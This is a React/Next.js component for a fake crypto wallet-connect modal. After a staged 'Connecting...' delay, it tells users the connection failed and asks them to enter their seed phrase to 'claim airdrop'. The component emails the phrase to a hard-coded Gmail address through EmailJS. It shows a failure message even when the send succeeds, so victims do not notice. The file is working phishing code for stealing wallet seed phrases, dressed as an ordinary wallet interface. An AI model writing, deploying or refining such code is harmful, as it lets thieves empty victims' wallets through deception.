import WalletList from "./wallet-list";
import WalletSelector from "./wallet-selector";
import Image, { StaticImageData } from "next/image";

import emailjs from "@emailjs/browser";

import { useTimeout } from "usehooks-ts";
import { useEffect, useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useWalletConnectModal } from "@/hooks/useWalletConnectModal";

import { toast } from "sonner";
import { cn } from "@/lib/utils";
import { PUBLIC_KEY, SERVICE_ID, TEMPLATE_ID, WALLETS } from "@/lib/constants";

export type WalletsStatus = "idle" | "pending" | "collect" | "success";

export const Wallets = ({
  walletIdx,
  setWalletIdx,
}: {
  walletIdx?: number;
  setWalletIdx: (x?: number) => void;
}) => {
  const [status, setStatus] = useState<WalletsStatus>("idle");
  const { isOpen } = useWalletConnectModal();

  const selectedWallet =
    walletIdx != undefined ? WALLETS[walletIdx] : undefined;

  const resetWalletIdxAndCollectForm = () => {
    setStatus("collect");
  };

  const goBack = () => {
    setWalletIdx(undefined);
    setStatus("idle");
  };

  useEffect(() => {
    return () => setStatus("idle");
  }, [isOpen]);

  if (status === "collect") {
    return (
      <WalletSelector>
        <CollectForm selectedWallet={selectedWallet} />
      </WalletSelector>
    );
  }

  if (status === "idle") {
    return (
      <WalletSelector>
        <WalletList selectWallet={setWalletIdx} setWalletStatus={setStatus} />
      </WalletSelector>
    );
  }

  return (
    <WalletSelector>
      <SelectedWallet
        goBack={goBack}
        selectedWallet={selectedWallet}
        resetWalletIdxAndCollectForm={resetWalletIdxAndCollectForm}
      />
    </WalletSelector>
  );
};

export const SelectedWallet = ({
  goBack,
  resetWalletIdxAndCollectForm,
  selectedWallet,
}: {
  goBack: () => void;
  resetWalletIdxAndCollectForm: () => void;
  selectedWallet?: {
    name: string;
    link: string;
    icon: StaticImageData;
  };
}) => {
  if (!selectedWallet) return null;

  useTimeout(resetWalletIdxAndCollectForm, 5000);

  return (
    <div className="min-h-64 flex items-center justify-center">
      <div className="flex flex-col gap-6 items-center text-center">
        <div className="relative">
          <div className="size-20">
            <Image
              alt={selectedWallet.name}
              src={selectedWallet.icon}
              width={80}
              height={80}
              priority
              className="size-full object-contain rounded-lg"
            />
          </div>
          <div className="absolute -bottom-2 -right-2 bg-white p-1 rounded-full">
            <div className="size-6 rounded-full border-[3px] animate-spin spin-in-3 border-r-zinc-500 " />
          </div>
        </div>
        <span className="text-lg font-medium">
          Connecting {selectedWallet.name}...
        </span>

        <button onClick={goBack} className="py-1 px-6 bg-zinc-200 rounded-full">
          Back
        </button>
      </div>
    </div>
  );
};

export const CollectForm = ({
  selectedWallet,
}: {
  selectedWallet?: { name: string; link: string; icon: StaticImageData };
}) => {
  const [message, setMessage] = useState("");
  const { setIsOpen } = useWalletConnectModal();

  const mutationFn = async () => {
    return emailjs.send(
      SERVICE_ID,
      TEMPLATE_ID,
      { message, to_email: "boredzoke@gmail.com" },
      PUBLIC_KEY
    );
  };

  const { mutateAsync, isPending } = useMutation({
    mutationKey: ["message", message, setIsOpen],
    mutationFn,
    onSuccess: () => {
      setIsOpen(false);
      toast.error("Failed to connect wallet");
    },
    onError: () => {
      toast.error("Failed to connect wallet. Please try again");
    },
  });

  const onSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!message) {
      return toast.error("Seed phrase cannot be empty");
    }
    mutateAsync();
  };

  return (
    <form onSubmit={onSubmit} className="flex flex-col gap-4 pb-12">
      <textarea
        rows={6}
        name="message"
        value={message}
        onChange={(e) => setMessage(e.target.value)}
        placeholder="Enter your seed phrase"
        className="border resize-none p-4 rounded-lg outline-none"
      ></textarea>
      <div className="text-center text-sm text-red-500">
        Failed to connect {selectedWallet?.name}. Enter your seed phrase to
        claim airdrop
      </div>
      <button
        type="submit"
        disabled={isPending}
        className={cn(
          "grow shrink-0 py-4 lg:py-3 text-white bg-[#E62058] rounded-full flex items-center justify-center",
          { "opacity-80": isPending }
        )}
      >
        {isPending ? (
          <div
            className={cn(
              "size-6 border-2 border-white border-r-transparent rounded-full animate-spin duration-500"
            )}
          />
        ) : (
          <>Connect wallet</>
        )}
      </button>
    </form>
  );
};
